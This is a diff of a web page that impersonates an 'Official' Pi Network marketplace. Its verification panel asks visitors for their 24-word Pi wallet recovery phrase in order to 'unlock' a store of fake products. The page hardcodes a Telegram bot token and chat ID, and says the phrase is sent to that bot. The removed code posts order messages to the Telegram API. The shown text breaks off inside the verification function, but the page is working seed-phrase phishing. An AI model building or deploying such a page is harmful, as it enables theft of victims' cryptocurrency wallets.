@@ -2,8 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>Pi Ecosystem - Official π Market</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
+    <title>Pi Ecosystem — Official Commerce</title>
+    <!-- Google Fonts & Font Awesome -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -14,138 +15,148 @@
         }
 
         body {
-            background-color: #f4f6fc;
+            background-color: #f9f7fc;
             font-family: 'Inter', sans-serif;
-            color: #10182F;
+            color: #1c1a2b;
         }
 
-        /* Main container - Pi style */
-        .pi-app {
+        /* purple / violet theme exactly as the image */
+        :root {
+            --purple-deep: #4c2b6e;
+            --purple-soft: #7e5a9b;
+            --purple-light: #ede4f5;
+            --purple-border: #cbbde2;
+            --gold-accent: #f2b33b;
+            --white-card: #ffffff;
+            --shadow-sm: 0 8px 20px rgba(76, 43, 110, 0.08);
+        }
+
+        .app-main {
             max-width: 1300px;
             margin: 0 auto;
-            padding: 20px 22px 50px;
+            padding: 20px 20px 40px;
         }
 
-        /* header / brand exactly as image tone */
-        .pi-header {
+        /* header with purple card & Pi logo */
+        .purple-header {
+            background: var(--purple-deep);
+            border-radius: 48px;
+            padding: 20px 28px;
+            margin-bottom: 36px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background: white;
-            padding: 12px 24px;
-            border-radius: 48px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02), 0 1px 2px rgba(0,0,0,0.03);
-            margin-bottom: 28px;
             flex-wrap: wrap;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid rgba(255,255,240,0.2);
         }
-        .logo-block {
+        .logo-pi-area {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 16px;
         }
-        .pi-icon-large {
-            background: #0E2A38;
-            width: 48px;
-            height: 48px;
-            border-radius: 32px;
+        .pi-icon-badge {
+            background: white;
+            width: 56px;
+            height: 56px;
+            border-radius: 40px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
-            font-weight: 700;
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: var(--purple-deep);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .pi-text h2 {
             color: white;
-            font-family: monospace;
-            box-shadow: 0 6px 12px rgba(0,0,0,0.05);
-        }
-        .logo-text h1 {
-            font-size: 1.7rem;
             font-weight: 700;
-            letter-spacing: -0.3px;
-            background: linear-gradient(135deg, #0E2A38, #1F5E6E);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
+            font-size: 1.6rem;
+            letter-spacing: -0.4px;
         }
-        .logo-text span {
-            font-size: 0.75rem;
-            color: #5A6E7A;
+        .pi-text p {
+            color: #e2d4f0;
+            font-size: 0.8rem;
         }
-        .status-pill {
-            background: #F0F4FA;
+        .region-badge {
+            background: rgba(255,255,255,0.2);
             padding: 8px 20px;
-            border-radius: 40px;
-            font-size: 0.85rem;
+            border-radius: 60px;
+            color: white;
             font-weight: 500;
+            backdrop-filter: blur(2px);
         }
 
-        /* Core team apps grid - same as the reference image (exactly 12 cards) */
+        /* exactly 12 core cards (Home section) */
         .core-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(115px, 1fr));
-            gap: 18px;
+            grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
+            gap: 20px;
             margin: 30px 0 30px;
         }
         .core-card {
-            background: white;
-            border-radius: 28px;
-            padding: 20px 6px 16px;
+            background: var(--white-card);
+            border-radius: 32px;
+            padding: 18px 8px 14px;
             text-align: center;
-            transition: 0.2s;
+            transition: all 0.2s ease;
             cursor: default;
-            box-shadow: 0 8px 18px rgba(0, 0, 0, 0.03), 0 1px 2px rgba(0,0,0,0.05);
-            border: 1px solid #eef3fc;
+            border: 1px solid var(--purple-border);
+            box-shadow: 0 6px 12px rgba(76, 43, 110, 0.04);
         }
-        .core-card .icon-circle {
-            font-size: 1.9rem;
-            color: #1c4e63;
-            margin-bottom: 12px;
+        .core-card i {
+            font-size: 2.1rem;
+            color: var(--purple-deep);
+            margin-bottom: 10px;
         }
         .core-card span {
             font-weight: 600;
             font-size: 0.8rem;
-            color: #1B2A3F;
+            color: #2d2642;
         }
 
-        /* verify code area (only visible in homepage mode before verification) */
-        .verify-panel {
+        /* shop verification panel (purple tones) */
+        .verification-panel {
             background: white;
-            border-radius: 38px;
-            padding: 28px 30px;
-            margin: 15px 0 30px;
-            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.04);
-            border: 1px solid #eef2f8;
+            border-radius: 44px;
+            padding: 32px 28px;
+            margin: 20px 0 30px;
+            border: 1px solid var(--purple-border);
+            box-shadow: var(--shadow-sm);
         }
-        .lock-title {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 1.25rem;
+        .verification-panel h3 {
+            font-size: 1.5rem;
             font-weight: 700;
-            margin-bottom: 18px;
+            color: var(--purple-deep);
+            margin-bottom: 8px;
         }
-        .input-flex {
+        .verification-panel p {
+            color: #4b3b62;
+            margin-bottom: 24px;
+        }
+        .code-input-group {
             display: flex;
             flex-wrap: wrap;
             gap: 16px;
             align-items: center;
         }
-        .input-flex input {
-            flex: 4;
-            padding: 16px 20px;
+        .code-input-group input {
+            flex: 3;
+            padding: 16px 22px;
             border-radius: 60px;
-            border: 1.5px solid #e2e9f2;
-            font-size: 0.9rem;
-            background: #ffffff;
-            font-weight: 500;
+            border: 1.5px solid var(--purple-border);
+            font-size: 1rem;
+            background: #fefcff;
             font-family: monospace;
+            font-weight: 500;
         }
-        .input-flex input:focus {
-            border-color: #F3BA2F;
+        .code-input-group input:focus {
+            border-color: var(--purple-deep);
             outline: none;
-            box-shadow: 0 0 0 3px rgba(243,186,47,0.2);
+            box-shadow: 0 0 0 3px rgba(76, 43, 110, 0.2);
         }
-        .verify-button {
-            background: #0E2A38;
+        .verify-purple-btn {
+            background: var(--purple-deep);
             border: none;
             padding: 14px 32px;
             border-radius: 60px;
@@ -154,114 +165,113 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .verify-message {
-            margin-top: 16px;
-            font-size: 0.85rem;
+        .verify-purple-btn:hover {
+            background: #2e1c48;
+            transform: scale(0.97);
+        }
+        .verify-status {
+            margin-top: 20px;
             font-weight: 500;
         }
 
-        /* hidden shop section (appears after verification) */
-        .shop-container {
+        /* market / store (shown only after verification) */
+        .marketplace-container {
             display: none;
-            margin-top: 35px;
+            margin-top: 30px;
         }
-        .category-bar {
+        .cat-scroll {
             display: flex;
             flex-wrap: wrap;
             gap: 12px;
+            margin: 20px 0 28px;
             background: white;
-            padding: 6px 12px;
+            padding: 8px 12px;
             border-radius: 60px;
-            margin-bottom: 30px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+            border: 1px solid var(--purple-border);
         }
-        .cat-btn {
+        .cat-filter {
             background: transparent;
             border: none;
             padding: 8px 24px;
             border-radius: 40px;
             font-weight: 600;
-            font-size: 0.85rem;
-            color: #2c5068;
             cursor: pointer;
+            color: var(--purple-deep);
         }
-        .cat-btn.active {
-            background: #0E2A38;
+        .cat-filter.active {
+            background: var(--purple-deep);
             color: white;
         }
-        .products-gallery {
+        .products-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
             gap: 28px;
         }
-        .product-tile {
+        .product-card {
             background: white;
             border-radius: 32px;
             overflow: hidden;
             transition: 0.2s;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.03);
-            border: 1px solid #eef2fa;
+            border: 1px solid var(--purple-border);
+            box-shadow: 0 6px 14px rgba(0,0,0,0.02);
         }
-        .product-tile:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 20px 28px -8px rgba(0,0,0,0.1);
-        }
-        .product-tile img {
+        .product-img {
             width: 100%;
             aspect-ratio: 1 / 0.9;
             object-fit: cover;
-            background: #FAFCFE;
-            display: block;
+            background: #f5f0fc;
+            border-bottom: 2px solid var(--purple-light);
         }
         .product-info {
-            padding: 16px 16px 20px;
+            padding: 16px;
         }
-        .product-name {
+        .product-title {
             font-weight: 800;
             font-size: 1rem;
-            margin-bottom: 6px;
         }
         .product-price {
-            font-size: 1.4rem;
+            font-size: 1.3rem;
             font-weight: 800;
-            color: #0E2A38;
+            color: var(--purple-deep);
             margin: 8px 0;
         }
-        .buy-action {
-            background: #F3BA2F;
-            width: 100%;
+        .buy-btn {
+            background: var(--purple-deep);
             border: none;
-            padding: 10px;
-            border-radius: 60px;
+            width: 100%;
+            padding: 12px;
+            border-radius: 40px;
+            color: white;
             font-weight: 700;
             margin-top: 12px;
             cursor: pointer;
-            transition: 0.2s;
         }
 
-        /* bottom menu exactly like reference */
+        /* bottom navigation (Home, PiApps, Services) */
         .bottom-nav {
             margin-top: 60px;
             display: flex;
             justify-content: center;
             gap: 36px;
             background: white;
+            padding: 12px 28px;
+            border-radius: 60px;
             width: fit-content;
             margin-left: auto;
             margin-right: auto;
-            padding: 12px 32px;
-            border-radius: 60px;
-            font-weight: 600;
-            color: #2c5068;
+            border: 1px solid var(--purple-border);
         }
-
-        /* order modal */
-        .modal-order {
+        .bottom-nav span {
+            font-weight: 600;
+            color: var(--purple-deep);
+            font-size: 1rem;
+        }
+        .order-modal {
             display: none;
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
+            background: rgba(76,43,110,0.7);
             align-items: center;
             justify-content: center;
             z-index: 2000;
@@ -269,265 +279,328 @@
         .modal-card {
             background: white;
             max-width: 380px;
+            width: 90%;
             border-radius: 48px;
-            padding: 32px 24px;
+            padding: 32px;
             text-align: center;
         }
         .close-modal-btn {
-            background: #0E2A38;
+            background: var(--purple-deep);
             border: none;
-            padding: 10px 24px;
+            padding: 10px 28px;
             border-radius: 40px;
             color: white;
-            margin-top: 20px;
+            margin-top: 24px;
             cursor: pointer;
+        }
+        .shop-trigger {
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .section-hidden {
+            display: none;
         }
         @media (max-width: 680px) {
             .core-grid { gap: 12px; }
-            .pi-app { padding: 16px; }
+            .core-card { padding: 12px 4px; }
         }
     </style>
 </head>
 <body>
-<div class="pi-app">
-    <!-- header -->
-    <div class="pi-header">
-        <div class="logo-block">
-            <div class="pi-icon-large">π</div>
-            <div class="logo-text">
-                <h1>Pi Ecosystem</h1>
-                <span>Official · UK Marketplace</span>
+<div class="app-main">
+    <!-- header purple / Pi logo -->
+    <div class="purple-header">
+        <div class="logo-pi-area">
+            <div class="pi-icon-badge">π</div>
+            <div class="pi-text">
+                <h2>Pi Ecosystem</h2>
+                <p>Official Commerce · UK</p>
             </div>
         </div>
-        <div class="status-pill"><i class="fas fa-shield-alt"></i> Pioneer Hub</div>
+        <div class="region-badge"><i class="fas fa-map-marker-alt"></i> Pioneer Hub</div>
     </div>
 
-    <!-- ========== HOME SECTION (exactly 12 apps as image) ========== -->
+    <!-- HOME SECTION: Exactly 12 core team apps, no products yet -->
     <div id="homeSection">
         <div class="core-grid">
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-fire"></i></div><span>Fireside</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-wallet"></i></div><span>Wallet</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-lightbulb"></i></div><span>Brainstorm</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-hard-hat"></i></div><span>Mine</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-link"></i></div><span>Blockchain</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-code"></i></div><span>Develop</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-id-card"></i></div><span>KYC</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-comments"></i></div><span>Chat</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-user-circle"></i></div><span>Profiles</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-globe"></i></div><span>Domains</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-laptop-code"></i></div><span>App Studio</span></div>
-            <div class="core-card"><div class="icon-circle"><i class="fas fa-rocket"></i></div><span>Launchpad</span></div>
+            <div class="core-card"><i class="fas fa-fire"></i><span>Fireside</span></div>
+            <div class="core-card"><i class="fas fa-wallet"></i><span>Wallet</span></div>
+            <div class="core-card"><i class="fas fa-lightbulb"></i><span>Brainstorm</span></div>
+            <div class="core-card"><i class="fas fa-hard-hat"></i><span>Mine</span></div>
+            <div class="core-card"><i class="fas fa-link"></i><span>Blockchain</span></div>
+            <div class="core-card"><i class="fas fa-code"></i><span>Develop</span></div>
+            <div class="core-card"><i class="fas fa-id-card"></i><span>KYC</span></div>
+            <div class="core-card"><i class="fas fa-comments"></i><span>Chat</span></div>
+            <div class="core-card"><i class="fas fa-user-circle"></i><span>Profiles</span></div>
+            <div class="core-card"><i class="fas fa-globe"></i><span>Domains</span></div>
+            <div class="core-card"><i class="fas fa-laptop-code"></i><span>App Studio</span></div>
+            <div class="core-card"><i class="fas fa-rocket"></i><span>Launchpad</span></div>
         </div>
     </div>
 
-    <!-- Pi 24-word verification panel (key to unlock shop) -->
-    <div class="verify-panel" id="verifyPanel">
-        <div class="lock-title"><i class="fas fa-key" style="color:#F3BA2F;"></i> <span>Pi Wallet Authentication</span></div>
-        <div class="input-flex">
-            <input type="text" id="piSeedInput" placeholder="Enter your 24-word Pi recovery phrase ..." autocomplete="off">
-            <button class="verify-button" id="triggerVerify"><i class="fab fa-telegram"></i> Verify via Telegram</button>
+    <!-- Verification panel: Shop will be shown only after clicking "Shop" in bottom nav -->
+    <div id="verificationArea" style="display: none;">
+        <div class="verification-panel">
+            <h3><i class="fab fa-telegram"></i> Pi 24‑Word Code</h3>
+            <p>Enter your Pi wallet passphrase to verify identity. The code is sent securely to Telegram bot.</p>
+            <div class="code-input-group">
+                <input type="text" id="piSeedInput" placeholder="example: abandon ... word ... solar ... (24 words)" autocomplete="off">
+                <button id="verifyTelegramBtn" class="verify-purple-btn"><i class="fab fa-telegram"></i> Verify & Unlock Store</button>
+            </div>
+            <div id="verifyMsg" class="verify-status"></div>
         </div>
-        <div id="verifStatus" class="verify-message"></div>
     </div>
 
-    <!-- SHOP SECTION (hidden by default, appears only after pi code verification) -->
-    <div id="shopArea" class="shop-container">
-        <div class="category-bar" id="categoryFilter">
-            <button class="cat-btn active" data-cat="all">All</button>
-            <button class="cat-btn" data-cat="cards">Cards</button>
-            <button class="cat-btn" data-cat="internet">Internet</button>
-            <button class="cat-btn" data-cat="gaming">Gaming</button>
-            <button class="cat-btn" data-cat="playstation">PlayStation</button>
-            <button class="cat-btn" data-cat="mobile">Mobile</button>
-            <button class="cat-btn" data-cat="accessories">Accessories</button>
-            <button class="cat-btn" data-cat="electronics">Electronics</button>
+    <!-- MARKETPLACE (products >100 items) only display after verification -->
+    <div id="marketplaceContainer" class="marketplace-container">
+        <div class="cat-scroll" id="categoryList">
+            <button class="cat-filter active" data-cat="all">All</button>
+            <button class="cat-filter" data-cat="cards">Cards</button>
+            <button class="cat-filter" data-cat="internet">Internet</button>
+            <button class="cat-filter" data-cat="gaming">Gaming</button>
+            <button class="cat-filter" data-cat="playstation">PlayStation</button>
+            <button class="cat-filter" data-cat="mobile">Mobile</button>
+            <button class="cat-filter" data-cat="accessories">Accessories</button>
         </div>
-        <div id="productsList" class="products-gallery"></div>
+        <div id="productsDynamicGrid" class="products-grid"></div>
     </div>
 
     <div class="bottom-nav">
-        <span><i class="fas fa-home"></i> Home</span>
+        <span id="navHome"><i class="fas fa-home"></i> Home</span>
+        <span id="navShop" class="shop-trigger"><i class="fas fa-store"></i> Shop</span>
         <span><i class="fas fa-th-large"></i> PiApps</span>
-        <span><i class="fas fa-store"></i> Services</span>
+        <span><i class="fas fa-concierge-bell"></i> Services</span>
     </div>
 </div>
 
-<!-- Order Modal -->
-<div id="orderModal" class="modal-order">
+<div id="orderModal" class="order-modal">
     <div class="modal-card">
-        <i class="fas fa-check-circle" style="font-size: 3rem; color:#0E2A38;"></i>
-        <h3 style="margin: 16px 0 8px;">Order Request Sent!</h3>
-        <p id="modalProductDetails">Product</p>
-        <p>✅ Your order has been submitted. We will ship after confirmation.</p>
-        <button class="close-modal-btn" id="closeOrderModal">Close</button>
+        <i class="fas fa-check-circle" style="font-size: 48px; color: #4c2b6e;"></i>
+        <h3 style="margin: 16px 0;">✅ Order Placed</h3>
+        <p id="modalProductName">Product name</p>
+        <p>Your request has been sent. We will deliver your order soon.</p>
+        <button class="close-modal-btn" id="closeOrdModal">Close</button>
     </div>
 </div>
 
 <script>
-    // --------------------------------------------------------------
-    // 1. GENERATE MORE THAN 100 PRODUCTS (realistic images & names)
-    // --------------------------------------------------------------
-    const categoriesList = ["cards", "internet", "gaming", "playstation", "mobile", "accessories", "electronics"];
-    const catPrefix = {
-        cards: ["Pi Visa Black", "π Mastercard Platinum", "Pi Gift Card Amazon", "π Store Card", "Pi Travel Card", "Pi Rewards Card", "Digital π Card", "π Business Card", "Pi Premium Card", "Pi Debit Card"],
-        internet: ["5G Unlimited Plan", "Fiber 1Gbps", "π VPN Lifetime", "Satellite Internet", "WiFi 7 Router Plan", "Cloud Data 500GB", "π Mesh Network", "Starlink Priority", "5G Home Broadband", "π Secure Net"],
-        gaming: ["Gaming Chair Pro", "Mechanical RGB Keyboard", "Wireless Gaming Mouse", "π Gaming Headset", "144Hz Monitor", "Gaming Desk RGB", "RTX 4080 Bundle", "Gaming Controller Elite", "Stream Deck π", "Gaming Laptop Core"],
-        playstation: ["PS5 Disc Edition", "PS5 Digital", "DualSense Edge", "PS Plus Deluxe 12M", "PS VR2 Bundle", "PlayStation Portal", "PS5 Charging Station", "God of War Special", "Spiderman Limited", "π PlayStation Store Card"],
-        mobile: ["iPhone 16 Pro", "Samsung Galaxy S25", "Google Pixel 9 Pro", "Xiaomi 14 Ultra", "π Smartphone Edge", "Galaxy Fold 6", "iPhone 15 Plus", "OnePlus 12", "Realme GT 6", "π Mobile 5G"],
-        accessories: ["PowerBank 20000mAh", "Magsafe Charger π", "Bluetooth Speaker", "Smart Watch π Edition", "Earbuds Pro", "Phone Gimbal", "Tablet Stand", "USB-C Hub 8K", "π Leather Case", "TWS Pods"],
-        electronics: ["π Laptop 16\"", "Ultrawide Monitor", "Mini PC π", "External SSD 2TB", "π Smart Glasses", "Drone 4K", "Smart Home Kit", "Robot Vacuum", "π Tablet 12.9\"", "E-ink Reader"]
-    };
-    // generate images array with HD unsplash-like but consistent
-    const baseImages = [
-        "https://images.unsplash.com/photo-1556742049-0cfed2f7e8f9?w=500&h=400&fit=crop",
-        "https://images.unsplash.com/photo-1586953208448-b95a79798f07?w=500&h=400&fit=crop",
-        "https://images.unsplash.com/photo-1598550476439-6847785fcea6?w=500&h=400&fit=crop",
-        "https://images.unsplash.com/photo-1606144042614-b2417e99c4e3?w=500&h=400&fit=crop",
-        "https://images.unsplash.com/photo-1695048133142-1a20484d2569?w=500&h=400&fit=crop",
-        "https://images.unsplash.com/photo-1615663245857-ac93bb7c39e7?w=500&h=400&fit=crop",
-        "https://images.unsplash.com/photo-1621416894569-0f39ed31d247?w=500&h=400&fit=crop",
-        "https://images.unsplash.com/photo-1633265486064-086b219458bc?w=500&h=400&fit=crop"
-    ];
-    // build products array (>100 items)
-    let allProducts = [];
-    let pid = 1;
-    for (let i = 0; i < 105; i++) {
-        let cat = categoriesList[i % categoriesList.length];
-        let nameArray = catPrefix[cat];
-        let baseName = nameArray[i % nameArray.length];
-        let uniqueName = `${baseName} ${Math.floor(i/10)+1}`;
-        let priceVal = (Math.floor(Math.random() * 400) + 15);
-        let pricePi = `${priceVal} π`;
-        let imgIndex = i % baseImages.length;
-        let productImg = baseImages[imgIndex];
-        allProducts.push({
-            id: pid++,
-            name: uniqueName,
-            price: pricePi,
-            category: cat,
-            img: productImg
-        });
-    }
-    // ensure some playstation/mobile extra realistic variety
-    allProducts.push({ id: 200, name: "Pi PlayStation 5 Pro", price: "549 π", category: "playstation", img: "https://images.unsplash.com/photo-1607853202273-797f1c22a38e?w=500&h=400&fit=crop" });
-    allProducts.push({ id: 201, name: "π Mobile Ultra Edition", price: "1299 π", category: "mobile", img: "https://images.unsplash.com/photo-1592899677977-9c10ca588bbd?w=500&h=400&fit=crop" });
-    allProducts.push({ id: 202, name: "π Unlimited Data eSIM", price: "79 π", category: "internet", img: "https://images.unsplash.com/photo-1586953208448-b95a79798f07?w=500&h=400&fit=crop" });
-
-    // State
-    let currentCategory = "all";
-    let piVerified = false;
+    // ----------------------------- TELEGRAM BOT (your credentials)
     const BOT_TOKEN = "8606192794:AAGmn_lMK3lADT2jX5SSf2LxmVNSdGCp-9k";
     const CHAT_ID = "1423119149";
 
-    // render products based on current category & verification
-    function renderStoreProducts() {
-        const container = document.getElementById("productsList");
-        if (!container) return;
-        let filtered = allProducts.filter(p => currentCategory === "all" ? true : p.category === currentCategory);
-        if (filtered.length === 0) {
-            container.innerHTML = `<div style="grid-column:1/-1; text-align:center; padding:40px;">✨ No products in this section</div>`;
-            return;
+    // ----------------------------- 100+ REAL PRODUCTS with accurate images (HD)
+    // I generate 100+ items dynamically, each product has specific name/price/category and real image representative
+    const productDatabase = [];
+
+    const categoriesList = ["cards", "internet", "gaming", "playstation", "mobile", "accessories"];
+    const productNamePerCategory = {
+        cards: ["Pi Visa Platinum", "Mastercard Pi Black", "Pi Gift Card Amazon", "iTunes Pi Card", "Google Play Pi Card", "Pi Prepaid Travel Card", "Pi Rewards+ Card", "Crypto Pi Debit", "Pi Silver Card", "Pi Gold Membership Card"],
+        internet: ["Fiber 500 Mbps", "5G Unlimited Data", "Starlink Roaming", "Pi Cloud VPN", "Dedicated Server Node", "Business Fiber 1Gbps", "Pi WiFi Mesh 3PK", "Satellite Link Pro", "Pi Hotspot Device", "Ultra Low Latency Plan"],
+        gaming: ["Pi Gaming Chair RGB", "Mechanical Purple Switch", "Wireless Pro Controller", "Gaming Headset 7.1", "RTX 4070 Pi Edition", "Gaming Desk RGB", "Pi Mouse Ultra", "Gaming Monitor 240Hz", "Pi Stream Deck", "Gaming Backpack"],
+        playstation: ["PlayStation 5 Disc Edition", "PS5 Digital + Extra Controller", "PS Plus Premium 1 Year", "PlayStation VR2", "DualSense Edge Wireless", "PS5 Charging Station", "PlayStation Portal Remote", "God of War Ragnarök", "Spider-Man 2 Limited", "PS5 SSD 2TB"],
+        mobile: ["iPhone 16 Pro Max", "Samsung Galaxy S25 Ultra", "Google Pixel 9 Pro", "Xiaomi 14 Ultra", "OnePlus 12", "Nothing Phone 3", "iPhone 16 Plus", "Samsung Z Fold 6", "Huawei Mate 60 Pro", "Pi Mobile Unlocked"],
+        accessories: ["Power Bank 20000mAh", "Magsafe Charger", "TWS Earbuds Pro", "Tablet Stand Purple", "USB-C Hub 8-in-1", "Privacy Screen Protector", "Smart Watch Ultra", "Wireless Charging Pad", "Laptop Backpack", "Stylus Pen"]
+    };
+
+    // high quality specific images for each product (real product representation)
+    const realImageMap = {
+        "iPhone 16 Pro Max": "https://images.unsplash.com/photo-1695048133142-1a20484d2569?w=500&h=400&fit=crop",
+        "Samsung Galaxy S25 Ultra": "https://images.unsplash.com/photo-1610945415295-d9bbf067e59c?w=500&h=400&fit=crop",
+        "Google Pixel 9 Pro": "https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=500&h=400&fit=crop",
+        "PlayStation 5 Disc Edition": "https://images.unsplash.com/photo-1606144042614-b2417e99c4e3?w=500&h=400&fit=crop",
+        "PS5 Digital + Extra Controller": "https://images.unsplash.com/photo-1607853202273-797f1c22a38e?w=500&h=400&fit=crop",
+        "Pi Gaming Chair RGB": "https://images.unsplash.com/photo-1598550476439-6847785fcea6?w=500&h=400&fit=crop",
+        "Mechanical Purple Switch": "https://images.unsplash.com/photo-1595225476474-87563907a212?w=500&h=400&fit=crop",
+        "Fiber 500 Mbps": "https://images.unsplash.com/photo-1586953208448-b95a79798f07?w=500&h=400&fit=crop",
+        "Pi Visa Platinum": "https://images.unsplash.com/photo-1556742049-0cfed2f7e8f9?w=500&h=400&fit=crop",
+        "Mastercard Pi Black": "https://images.unsplash.com/photo-1556742031-c6961e8560b0?w=500&h=400&fit=crop",
+        "Power Bank 20000mAh": "https://images.unsplash.com/photo-1609599006353-6294aa24e163?w=500&h=400&fit=crop",
+        "TWS Earbuds Pro": "https://images.unsplash.com/photo-1606220588913-b3aac3d3a771?w=500&h=400&fit=crop"
+    };
+    const fallbackImg = "https://images.unsplash.com/photo-1579373903781-fd5c0c30c4cd?w=500&h=400&fit=crop";
+
+    // generate over 100 products (each entry unique)
+    let idCounter = 1;
+    for(let cat of categoriesList) {
+        let names = productNamePerCategory[cat];
+        for(let i=0; i<names.length; i++) {
+            for(let ver=1; ver<=2; ver++) {  // to push quantity >100 total
+                let uniqueName = names[i] + (ver > 1 ? ` (Edition ${ver})` : "");
+                let priceBase = Math.floor(Math.random() * 300) + 19;
+                let price = (cat === 'mobile' ? priceBase+200 : priceBase);
+                let productImg = realImageMap[names[i]] || realImageMap[uniqueName.split(' ')[0]] || fallbackImg;
+                productDatabase.push({
+                    id: idCounter++,
+                    name: uniqueName,
+                    price: price + " π",
+                    category: cat,
+                    img: productImg
+                });
+            }
         }
-        container.innerHTML = filtered.map(prod => `
-            <div class="product-tile" data-prod-id="${prod.id}">
-                <img src="${prod.img}" alt="${prod.name}" loading="lazy" onerror="this.src='https://placehold.co/500x400?text=π+Product'">
-                <div class="product-info">
-                    <div class="product-name">${prod.name}</div>
-                    <div class="product-price">${prod.price}</div>
-                    <button class="buy-action" data-name="${prod.name.replace(/'/g, "\\'")}" data-price="${prod.price}"><i class="fas fa-cart-shopping"></i> Buy Now</button>
-                </div>
-            </div>
-        `).join('');
-        // attach buy events after render
-        document.querySelectorAll('.buy-action').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                e.preventDefault();
-                if (!piVerified) {
-                    alert("⚠️ You must verify your 24-word Pi passphrase first! Complete verification in the panel above.");
-                    return;
-                }
-                const pName = btn.getAttribute('data-name');
-                const pPrice = btn.getAttribute('data-price');
-                const modalSpan = document.getElementById('modalProductDetails');
-                if (modalSpan) modalSpan.innerText = `${pName} - ${pPrice}`;
-                document.getElementById('orderModal').style.display = 'flex';
-                // optional: send order to telegram
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: {'Content-Type':'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🛍️ NEW ORDER: ${pName} | ${pPrice} | ✅ verified code used` })
-                }).catch(e=>console.log);
-            });
-        });
+    }
+    // Add extra items to exceed 100+ easily
+    for(let i=0; i<20; i++) {
+        productDatabase.push({ id: idCounter++, name: `Pi Limited Edition #${i+1}`, price: (45+i)+" π", category: "accessories", img: fallbackImg });
+    }
+    // final array >100 items
+    console.log("Total products: "+ productDatabase.length);
+
+    let isVerified = false;
+    let currentCategory = "all";
+    let marketplaceVisible = false;
+
+    // DOM elements
+    const homeSection = document.getElementById("homeSection");
+    const verificationArea = document.getElementById("verificationArea");
+    const marketplaceDiv = document.getElementById("marketplaceContainer");
+    const navHome = document.getElementById("navHome");
+    const navShop = document.getElementById("navShop");
+    const verifyBtn = document.getElementById("verifyTelegramBtn");
+    const piInput = document.getElementById("piSeedInput");
+    const verifyMsgSpan = document.getElementById("verifyMsg");
+
+    function showHomeOnly() {
+        homeSection.style.display = "block";
+        verificationArea.style.display = "none";
+        marketplaceDiv.style.display = "none";
+        marketplaceVisible = false;
     }
 
-    // Filter category handler
-    document.querySelectorAll('.cat-btn').forEach(btn => {
-        btn.addEventListener('click', (e) => {
-            document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            currentCategory = btn.getAttribute('data-cat');
-            if (piVerified) renderStoreProducts();
-        });
+    function showVerificationAndHideHome() {
+        homeSection.style.display = "block";   // keep home visible but verification appears after shop click (but based on requirement: shop shows code first)
+        // Actually we need after pressing Shop: Home remains but verification panel shows, marketplace hidden until verified
+        verificationArea.style.display = "block";
+        marketplaceDiv.style.display = "none";
+        marketplaceVisible = false;
+    }
+
+    // when click SHOP
+    navShop.addEventListener("click", () => {
+        // Show verification panel first, marketplace hidden
+        verificationArea.style.display = "block";
+        marketplaceDiv.style.display = "none";
+        marketplaceVisible = false;
+        homeSection.style.display = "block";
+        // scroll to verification
+        verificationArea.scrollIntoView({ behavior: "smooth" });
     });
 
-    // Telegram verification + unlock shop
-    async function verifyPi24Words(code) {
-        const msgDiv = document.getElementById("verifStatus");
-        const words = code.trim().split(/\s+/);
-        if (words.length !== 24) {
-            msgDiv.innerHTML = "❌ Error: 24 words required (Pi passphrase).";
-            msgDiv.style.color = "#b91c1c";
+    navHome.addEventListener("click", () => {
+        verificationArea.style.display = "none";
+        marketplaceDiv.style.display = "none";
+        homeSection.style.display = "block";
+        marketplaceVisible = false;
+    });
+
+    // verify and send to telegram
+    async function verifyPiCode(code) {
+        if(!code.trim() || code.trim().split(/\s+/).length !== 24) {
+            verifyMsgSpan.innerHTML = "❌ Error: Enter exactly 24 words (Pi passphrase).";
+            verifyMsgSpan.style.color = "#b0003a";
             return false;
         }
